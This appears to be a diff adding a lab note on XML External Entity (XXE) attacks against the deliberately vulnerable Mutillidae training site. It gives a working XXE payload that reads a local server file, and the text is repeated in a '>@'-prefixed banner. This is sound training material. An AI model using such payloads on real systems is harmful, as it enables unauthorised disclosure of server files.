@@ -1,0 +1,61 @@
+XML External Entity | XXE
+
+XML External Entity attack, or simply XXE attack, is a type of attack against an application that parses XML input. 
+This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured 
+XML parser. This attack may lead to the disclosure of confidential data, DoS attacks, server-side request forgery, 
+port scanning from the perspective of the machine where the parser is located, and other[which?] system impacts.
+
+-> Open the vulnerable Mutillidae site
+Mutillidae should be installed in the Win10 machine.
+On Kali, open http://<Win10 IP>/mutillidae.
+Put Security level at 0 (Hosed).
+
+-> Try an intrusion
+1. Choose on the left OWASP 2017 / A4 - XML External Entities / XML External Entity Injection / XML Validator
+    
+2. Try some XML.
+  In the case, put:
+  ---
+  <?xml version="1.0"?>
+  <!DOCTYPE fichier [
+  <!ELEMENT fichier ANY>
+  <!ENTITY ext SYSTEM "../../xampp-control.ini"> ]>
+  <fichier>&ext;</fichier>
+  ---
+
+/!\ Note that all files could not be retrieve with this method. Try some different types of file to check.
+
+>@
+>@########################################################################################################################
+>@#                                                                                                                      #
+>@# [ XML External Entity | XXE ]                                                                                        #
+>@#                                                                                                                      #
+>@# XML External Entity attack, or simply XXE attack, is a type of attack against an application that parses XML input.  # 
+>@# This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured   #
+>@# XML parser. This attack may lead to the disclosure of confidential data, DoS attacks, server-side request forgery,   #
+>@# port scanning from the perspective of the machine where the parser is located, and other[which?] system impacts.     #
+>@#                                                                                                                      #
+>@#----------------------------------------------------------------------------------------------------------------------#
+>@
+>@-> Open the vulnerable Mutillidae site
+>@Mutillidae should be installed in the Win10 machine.
+>@On Kali, open http://<Win10 IP>/mutillidae.
+>@Put Security level at 0 (Hosed).
+>@
+>@-> Try an intrusion
+>@1. Choose on the left OWASP 2017 / A4 - XML External Entities / XML External Entity Injection / XML Validator
+>@    
+>@2. Try some XML.
+>@  In the case, put:
+>@  ---
+>@  <?xml version="1.0"?>
+>@  <!DOCTYPE fichier [
+>@  <!ELEMENT fichier ANY>
+>@  <!ENTITY ext SYSTEM "../../xampp-control.ini"> ]>
+>@  <fichier>&ext;</fichier>
+>@  ---
+>@
+>@/!\ Note that all files could not be retrieve with this method. Try some different types of file to check.
+>@
+>@########################################################################################################################
+>@
